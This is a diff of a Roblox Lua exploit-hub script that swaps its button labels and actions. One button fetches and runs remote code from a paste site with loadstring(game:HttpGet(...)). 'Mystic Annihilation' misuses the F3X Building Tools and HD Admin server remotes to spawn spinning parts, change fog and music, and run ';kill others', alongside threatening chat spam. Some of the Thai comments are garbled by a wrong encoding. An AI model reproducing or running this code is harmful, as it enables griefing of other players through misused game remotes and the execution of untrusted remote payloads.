@@ -764,11 +764,11 @@ button.Size = UDim2.new(0.5,-3,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "proj f3x by shd0skid"
+button.Text = "Stummy Guns"
 button.TextColor3 = whit
 button.TextWrapped = true
 button.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("https://files.catbox.moe/hf8mu0.txt", true))()
+loadstring(game:HttpGet("https://pastefy.app/Dai6p171/raw"))()
 end)
 
 --
@@ -10365,11 +10365,541 @@ button.Size = UDim2.new(0.499,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Worship (R6!)"
+button.Text = "Mystic Annihilation"
 button.TextColor3 = whit
 button.TextWrapped = true
 button.MouseButton1Down:connect(function()
-loadstring(game:HttpGet("https://files.catbox.moe/8e8ivx.txt"))()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+RequestCommand:InvokeServer(";music 1837808628 ;volume inf")      -- F3X Spinning Decal Foot Part Script
+-- เธชเธฃเนเธฒเธ Part เธเธเธฒเธ” 65/1/66 เธเธฃเธฑเธ Transparency เน€เธเนเธ 1 (Material Tool) + เนเธชเน Decal เธ”เนเธฒเธเธเธ + เธ•เธดเธ”เธ•เธฒเธกเน€เธ—เนเธฒเนเธฅเธฐเธซเธกเธธเธ
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local backpack = player:WaitForChild("Backpack")
+
+-- เธเนเธเธซเธฒ F3X Tool
+local tool = backpack:FindFirstChild("Building Tools") or char:FindFirstChild("Building Tools")
+if not tool then
+    tool = backpack:WaitForChild("Building Tools", 10) or char:WaitForChild("Building Tools", 10)
+end
+
+if not tool then
+    for _, v in pairs(player:GetDescendants()) do
+        if v.Name == "SyncAPI" then tool = v.Parent break end
+    end
+end
+
+if not tool then
+    warn("เนเธกเนเน€เธเธญ Building Tools")
+    return
+end
+
+local remote = tool.SyncAPI.ServerEndpoint
+local function _(args)
+    remote:InvokeServer(unpack(args))
+end
+
+-- เธเธฑเธเธเนเธเธฑเธ F3X
+function CreatePart(cf, parent)
+    _( {"CreatePart", "Normal", cf, parent} )
+end
+
+function SetSize(part, size)
+    _( {"SyncResize", {{Part = part, Size = size, CFrame = part.CFrame}}} )
+end
+
+function SetAnchor(part, boolean)
+    _( {"SyncAnchor", {{Part = part, Anchored = boolean}}} )
+end
+
+-- เธเธฃเธฑเธ Transparency เธเนเธฒเธ Material Tool (SyncMaterial)
+function SetMaterialTransparency(part, value)
+    _( {
+        "SyncMaterial",
+        {
+            {
+                Part = part,
+                Transparency = value
+            }
+        }
+    })
+end
+
+-- เธฃเธฐเธเธ SpawnDecal เธ•เธฒเธกเธ—เธตเนเธเธธเธ“เธเธณเธซเธเธ”
+local function SpawnDecal(part, side, id)
+    _( {
+        "CreateTextures",
+        {
+            {
+                Part = part,
+                Face = side,
+                TextureType = "Decal"
+            }
+        }
+    })
+    _( {
+        "SyncTexture",
+        {
+            {
+                Part = part,
+                Face = side,
+                TextureType = "Decal",
+                Texture = "rbxassetid://" .. id
+            }
+        }
+    })
+end
+
+function DestroyPart(part)
+    _( {"Remove", {part}} )
+end
+
+local followPart
+local followLoop
+local rotationAngle = 0
+local rotationSpeed = 5 -- เธเธงเธฒเธกเน€เธฃเนเธงเนเธเธเธฒเธฃเธซเธกเธธเธ
+
+function StartFollowing()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    -- เธชเธฃเนเธฒเธ Part เน€เธฃเธดเนเธกเธ•เนเธเธ—เธตเนเธ•เธณเนเธซเธเนเธเน€เธ—เนเธฒ
+    local spawnPos = hrp.CFrame * CFrame.new(0, -3, 0)
+    CreatePart(spawnPos, workspace)
+
+    -- เธเนเธเธซเธฒ Part เธ—เธตเนเน€เธเธดเนเธเธชเธฃเนเธฒเธ
+    local found = false
+    for i = 1, 50 do
+        task.wait()
+        for _, v in pairs(workspace:GetChildren()) do
+            if v:IsA("BasePart") and (v.Position - spawnPos.Position).Magnitude < 2 then
+                followPart = v
+                found = true
+                break
+            end
+        end
+        if found then break end
+    end
+
+    if not followPart then return end
+
+    -- เธ•เธฑเนเธเธเนเธฒเน€เธฃเธดเนเธกเธ•เนเธ
+    SetAnchor(followPart, true)
+    SetSize(followPart, Vector3.new(65, 1, 66))
+    
+    -- เธเธฃเธฑเธ Transparency เน€เธเนเธ 1 เธเนเธฒเธ Material Tool
+    SetMaterialTransparency(followPart, 1)
+    
+    -- เนเธชเน Decal เธ—เธตเนเธ”เนเธฒเธเธเธ (Top) เธ•เธฒเธก ID เธ—เธตเนเธเธณเธซเธเธ”
+    SpawnDecal(followPart, Enum.NormalId.Top, "196689311")
+
+    -- เน€เธฃเธดเนเธก Loop เธ•เธดเธ”เธ•เธฒเธกเนเธฅเธฐเธซเธกเธธเธ
+    followLoop = RunService.Heartbeat:Connect(function()
+        if not followPart or not followPart.Parent or not char or not char:FindFirstChild("HumanoidRootPart") then
+            if followLoop then followLoop:Disconnect() end
+            return
+        end
+
+        local currentHRP = char.HumanoidRootPart
+        rotationAngle = (rotationAngle + rotationSpeed) % 360
+        
+        -- เธเธณเธเธงเธ“เธ•เธณเนเธซเธเนเธเนเธ•เนเน€เธ—เนเธฒเนเธฅเธฐเธกเธธเธกเธซเธกเธธเธ
+        local targetCF = CFrame.new(currentHRP.Position + Vector3.new(0, -3.5, 0)) * CFrame.Angles(0, math.rad(rotationAngle), 0)
+        
+        -- เธญเธฑเธเน€เธ”เธ•เธ•เธณเนเธซเธเนเธเนเธฅเธฐเธกเธธเธกเธซเธกเธธเธเธเนเธฒเธ SyncAPI
+        _( {"SyncMove", {{Part = followPart, CFrame = targetCF}}} )
+    end)
+    
+    print("เน€เธฃเธดเนเธกเธเธฒเธฃเธ•เธดเธ”เธ•เธฒเธกเนเธฅเธฐเธซเธกเธธเธ Part (เธฅเนเธญเธเธซเธเธเนเธฒเธ Material + Decal เธ”เนเธฒเธเธเธ) เนเธฅเนเธง!")
+end
+
+function ResetFollow()
+    if followLoop then
+        followLoop:Disconnect()
+        followLoop = nil
+    end
+    if followPart then
+        DestroyPart(followPart)
+        followPart = nil
+    end
+    task.spawn(StartFollowing)
+end
+
+-- เธเธฑเธ”เธเธฒเธฃเน€เธกเธทเนเธญเธ•เธฑเธงเธฅเธฐเธเธฃเธ•เธฒเธขเธซเธฃเธทเธญเน€เธเธดเธ”เนเธซเธกเน
+player.CharacterAdded:Connect(function(newChar)
+    char = newChar
+    ResetFollow()
+end)
+
+if char and char:FindFirstChild("Humanoid") then
+    char:WaitForChild("Humanoid").Died:Connect(function()
+        ResetFollow()
+    end)
+end
+
+-- เน€เธฃเธดเนเธกเธ—เธณเธเธฒเธเธ—เธฑเธเธ—เธต
+StartFollowing()  wait(3)  -- F3X Vertical Spinning Four Walls Script (Height Fixed)
+-- สร้างกำแพง 4 ด้าน ล่องหน + ใส่ Decal + หมุนแนวตั้ง (เหมือนเดิม)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local backpack = player:WaitForChild("Backpack")
+
+-- ===== ปรับตรงนี้อย่างเดียว =====
+local heightOffset = 29 -- 🔼 ความสูงของกำแพงทั้งชุด
+-- ===============================
+
+-- ค้นหา F3X Tool
+local tool = backpack:FindFirstChild("Building Tools") or char:FindFirstChild("Building Tools")
+if not tool then
+    tool = backpack:WaitForChild("Building Tools", 10) or char:WaitForChild("Building Tools", 10)
+end
+
+if not tool then
+    for _, v in pairs(player:GetDescendants()) do
+        if v.Name == "SyncAPI" then tool = v.Parent break end
+    end
+end
+
+if not tool then
+    warn("ไม่เจอ Building Tools")
+    return
+end
+
+local remote = tool.SyncAPI.ServerEndpoint
+local function _(args)
+    remote:InvokeServer(unpack(args))
+end
+
+-- ฟังก์ชัน F3X
+function CreatePart(cf, parent)
+    _( {"CreatePart", "Normal", cf, parent} )
+end
+
+function SetSize(part, size)
+    _( {"SyncResize", {{Part = part, Size = size, CFrame = part.CFrame}}} )
+end
+
+function SetAnchor(part, boolean)
+    _( {"SyncAnchor", {{Part = part, Anchored = boolean}}} )
+end
+
+function SetMaterialTransparency(part, value)
+    _( {"SyncMaterial", {{Part = part, Transparency = value}}} )
+end
+
+local function SpawnDecal(part, side, id)
+    _( {
+        "CreateTextures",
+        {
+            { Part = part, Face = side, TextureType = "Decal" }
+        }
+    })
+    _( {
+        "SyncTexture",
+        {
+            {
+                Part = part,
+                Face = side,
+                TextureType = "Decal",
+                Texture = "rbxassetid://" .. id
+            }
+        }
+    })
+end
+
+local wallParts = {}
+local wallLoop
+local rotationAngle = 0
+local rotationSpeed = 5
+local distance = 31
+local decalId = "196689311"
+
+local wallData = {
+    {offset = Vector3.new(0, 0, -distance), size = Vector3.new(65,65,0.1), faces={Enum.NormalId.Front,Enum.NormalId.Back}, axis="Z"},
+    {offset = Vector3.new(0, 0,  distance), size = Vector3.new(65,65,0.1), faces={Enum.NormalId.Front,Enum.NormalId.Back}, axis="Z"},
+    {offset = Vector3.new(-distance,0,0),  size = Vector3.new(0.1,65,65), faces={Enum.NormalId.Left,Enum.NormalId.Right}, axis="X"},
+    {offset = Vector3.new( distance,0,0),  size = Vector3.new(0.1,65,65), faces={Enum.NormalId.Left,Enum.NormalId.Right}, axis="X"},
+}
+
+function StartSpinningWalls()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    -- สร้างกำแพง
+    for _, data in ipairs(wallData) do
+        local spawnPos =
+            hrp.CFrame
+            * CFrame.new(data.offset)
+            * CFrame.new(0, heightOffset, 0)
+
+        CreatePart(spawnPos, workspace)
+
+        local wallPart
+        for _ = 1, 20 do
+            task.wait(0.05)
+            for _, v in pairs(workspace:GetChildren()) do
+                if v:IsA("BasePart") and (v.Position - spawnPos.Position).Magnitude < 5 then
+                    wallPart = v
+                    break
+                end
+            end
+            if wallPart then break end
+        end
+
+        if wallPart then
+            table.insert(wallParts, {part = wallPart, data = data})
+            SetAnchor(wallPart, true)
+            SetSize(wallPart, data.size)
+            SetMaterialTransparency(wallPart, 1)
+            for _, face in ipairs(data.faces) do
+                SpawnDecal(wallPart, face, decalId)
+            end
+        end
+    end
+
+    -- Loop หมุน (เหมือนเดิม)
+    wallLoop = RunService.Heartbeat:Connect(function()
+        if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+
+        rotationAngle = (rotationAngle + rotationSpeed) % 360
+        local hrpPos = char.HumanoidRootPart.Position
+
+        local updates = {}
+        for _, item in ipairs(wallParts) do
+            local baseCF =
+                CFrame.new(hrpPos + item.data.offset + Vector3.new(0, heightOffset, 0))
+
+            local rotationCF =
+                (item.data.axis == "Z")
+                and CFrame.Angles(0, 0, math.rad(rotationAngle))
+                or  CFrame.Angles(math.rad(rotationAngle), 0, 0)
+
+            table.insert(updates, {Part = item.part, CFrame = baseCF * rotationCF})
+        end
+
+        _( {"SyncMove", updates} )
+    end)
+end
+
+function ResetWalls()
+    if wallLoop then wallLoop:Disconnect() end
+    for _, item in ipairs(wallParts) do
+        _( {"Remove", {item.part}} )
+    end
+    wallParts = {}
+    StartSpinningWalls()
+end
+
+player.CharacterAdded:Connect(function(c)
+    char = c
+    task.wait(1)
+    ResetWalls()
+end)
+
+StartSpinningWalls()  wait(5)   -- F3X Vertical Spinning Four Walls Script (Height Fixed)
+-- สร้างกำแพง 4 ด้าน ล่องหน + ใส่ Decal + หมุนแนวตั้ง (เหมือนเดิม)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local backpack = player:WaitForChild("Backpack")
+
+-- ===== ปรับตรงนี้อย่างเดียว =====
+local heightOffset = 90 -- 🔼 ความสูงของกำแพงทั้งชุด
+-- ===============================
+
+-- ค้นหา F3X Tool
+local tool = backpack:FindFirstChild("Building Tools") or char:FindFirstChild("Building Tools")
+if not tool then
+    tool = backpack:WaitForChild("Building Tools", 10) or char:WaitForChild("Building Tools", 10)
+end
+
+if not tool then
+    for _, v in pairs(player:GetDescendants()) do
+        if v.Name == "SyncAPI" then tool = v.Parent break end
+    end
+end
+
+if not tool then
+    warn("ไม่เจอ Building Tools")
+    return
+end
+
+local remote = tool.SyncAPI.ServerEndpoint
+local function _(args)
+    remote:InvokeServer(unpack(args))
+end
+
+-- ฟังก์ชัน F3X
+function CreatePart(cf, parent)
+    _( {"CreatePart", "Normal", cf, parent} )
+end
+
+function SetSize(part, size)
+    _( {"SyncResize", {{Part = part, Size = size, CFrame = part.CFrame}}} )
+end
+
+function SetAnchor(part, boolean)
+    _( {"SyncAnchor", {{Part = part, Anchored = boolean}}} )
+end
+
+function SetMaterialTransparency(part, value)
+    _( {"SyncMaterial", {{Part = part, Transparency = value}}} )
+end
+
+local function SpawnDecal(part, side, id)
+    _( {
+        "CreateTextures",
+        {
+            { Part = part, Face = side, TextureType = "Decal" }
+        }
+    })
+    _( {
+        "SyncTexture",
+        {
+            {
+                Part = part,
+                Face = side,
+                TextureType = "Decal",
+                Texture = "rbxassetid://" .. id
+            }
+        }
+    })
+end
+
+local wallParts = {}
+local wallLoop
+local rotationAngle = 0
+local rotationSpeed = 5
+local distance = 31
+local decalId = "196689311"
+
+local wallData = {
+    {offset = Vector3.new(0, 0, -distance), size = Vector3.new(65,65,0.1), faces={Enum.NormalId.Front,Enum.NormalId.Back}, axis="Z"},
+    {offset = Vector3.new(0, 0,  distance), size = Vector3.new(65,65,0.1), faces={Enum.NormalId.Front,Enum.NormalId.Back}, axis="Z"},
+    {offset = Vector3.new(-distance,0,0),  size = Vector3.new(0.1,65,65), faces={Enum.NormalId.Left,Enum.NormalId.Right}, axis="X"},
+    {offset = Vector3.new( distance,0,0),  size = Vector3.new(0.1,65,65), faces={Enum.NormalId.Left,Enum.NormalId.Right}, axis="X"},
+}
+
+function StartSpinningWalls()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    -- สร้างกำแพง
+    for _, data in ipairs(wallData) do
+        local spawnPos =
+            hrp.CFrame
+            * CFrame.new(data.offset)
+            * CFrame.new(0, heightOffset, 0)
+
+        CreatePart(spawnPos, workspace)
+
+        local wallPart
+        for _ = 1, 20 do
+            task.wait(0.05)
+            for _, v in pairs(workspace:GetChildren()) do
+                if v:IsA("BasePart") and (v.Position - spawnPos.Position).Magnitude < 5 then
+                    wallPart = v
+                    break
+                end
+            end
+            if wallPart then break end
+        end
+
+        if wallPart then
+            table.insert(wallParts, {part = wallPart, data = data})
+            SetAnchor(wallPart, true)
+            SetSize(wallPart, data.size)
+            SetMaterialTransparency(wallPart, 1)
+            for _, face in ipairs(data.faces) do
+                SpawnDecal(wallPart, face, decalId)
+            end
+        end
+    end
+
+    -- Loop หมุน (เหมือนเดิม)
+    wallLoop = RunService.Heartbeat:Connect(function()
+        if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+
+        rotationAngle = (rotationAngle + rotationSpeed) % 360
+        local hrpPos = char.HumanoidRootPart.Position
+
+        local updates = {}
+        for _, item in ipairs(wallParts) do
+            local baseCF =
+                CFrame.new(hrpPos + item.data.offset + Vector3.new(0, heightOffset, 0))
+
+            local rotationCF =
+                (item.data.axis == "Z")
+                and CFrame.Angles(0, 0, math.rad(rotationAngle))
+                or  CFrame.Angles(math.rad(rotationAngle), 0, 0)
+
+            table.insert(updates, {Part = item.part, CFrame = baseCF * rotationCF})
+        end
+
+        _( {"SyncMove", updates} )
+    end)
+end
+
+function ResetWalls()
+    if wallLoop then wallLoop:Disconnect() end
+    for _, item in ipairs(wallParts) do
+        _( {"Remove", {item.part}} )
+    end
+    wallParts = {}
+    StartSpinningWalls()
+end
+
+player.CharacterAdded:Connect(function(c)
+    char = c
+    task.wait(1)
+    ResetWalls()
+end)
+
+StartSpinningWalls()  wait(1) local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+RequestCommand:InvokeServer(";fogcolor red 100") wait(1)    RequestCommand:InvokeServer(";fog 100")   -- ===============================
+-- CHAT ONLY SCRIPT
+-- ===============================
+
+local TextChatService = game:GetService("TextChatService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local channel = TextChatService.TextChannels.RBXGeneral
+
+local function Send(msg, delayTime)
+	if channel then
+		channel:SendAsync(msg)
+	end
+	task.wait(delayTime or 2)
+end
+
+Send([[You've Angered The Mystic Gods,
+For That I Will Not Let You Live
+In This Realm!]], 2)
+
+Send([[Witness The Power That Zeus Himself
+Is Afraid Of!]], 1.8)
+
+Send([[Souls, Come To Me In All Your Glory!]], 2)
+
+Send([[You Cannot Run From My Wrath,
+I Will Destroy Every Last One Of You!]], 2.8)
+
+Send([[Arc Of The Mystic:
+Mystic Annihilation!]], 2) local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+RequestCommand:InvokeServer(";kill others") wait(7.7) local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+RequestCommand:InvokeServer(";unmusic ;unfog") 
 end)
 --
 local button = Instance.new("TextButton")
@@ -16014,30 +16544,17 @@ button.Size = UDim2.new(0.5,-3,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Disco Fog"
+button.Text = "Rampage"
 button.TextColor3 = whit
 button.TextWrapped = true
 button.MouseButton1Down:connect(function()
 	local ReplicatedStorage = game:GetService("ReplicatedStorage")
 	local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
 
-	RequestCommandSilent:InvokeServer(";fog 350")
-	while true do
-		RequestCommandSilent:InvokeServer(";fogcolor red")
-		wait(2)
-		RequestCommandSilent:InvokeServer(";fogcolor blue")
-		wait(2)
-		RequestCommandSilent:InvokeServer(";fogcolor green")
-		wait(2)
-		RequestCommandSilent:InvokeServer(";fogcolor yellow")
-		wait(2)
-		RequestCommandSilent:InvokeServer(";fogcolor pink")
-		wait(2)
-		RequestCommandSilent:InvokeServer(";fogcolor orange")
-		wait(2)
-		RequestCommandSilent:InvokeServer(";fogcolor purple")
-		wait(2)
-	end
+	RequestCommandSilent:InvokeServer(";r15")
+    	RequestCommandSilent:InvokeServer(";emote me 76358606468919")
+    
+
 end)
 --
 local button = Instance.new("TextButton")
@@ -29494,11 +30011,11 @@ button.Size = UDim2.new(0.5,-3,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "k00ppred"
+button.Text = "LARFP"
 button.TextColor3 = whit
 button.TextWrapped = true
 button.MouseButton1Down:connect(function()
-	frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 9422866248	
+	frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 116539302106509	
 end)
 --
 local button = Instance.new("TextButton")
